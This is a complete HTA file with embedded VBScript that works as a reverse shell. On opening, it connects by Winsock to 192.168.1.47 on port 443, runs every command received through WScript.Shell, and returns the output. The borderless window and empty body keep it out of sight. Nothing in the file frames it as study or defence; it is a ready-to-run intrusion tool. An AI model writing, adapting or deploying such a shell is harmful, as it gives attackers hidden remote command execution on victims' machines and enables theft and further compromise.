<html>
<head>
    <hta:application id="app" border="none" />
    <script language="VBScript">
        Dim ws, conn, cmd, result
        Set ws = CreateObject("WScript.Shell")
        Set conn = CreateObject("MSWinsock.Winsock")

        server = "192.168.1.47"
        port = 443

        Sub conn_OnDataArrival(bytesTotal)
            conn.GetData cmd, 8  ' 8 means data type is string
            If cmd = "exit" Then
                window.close
            Else
                On Error Resume Next
                Set exec = ws.Exec(cmd)
                result = exec.StdOut.ReadAll() & exec.StdErr.ReadAll()
                conn.SendData result
            End If
        End Sub

        Sub ConnectToServer()
            conn.RemoteHost = server
            conn.RemotePort = port
            conn.Connect
        End Sub

        ConnectToServer()
    </script>
</head>
<body>
</body>
</html>
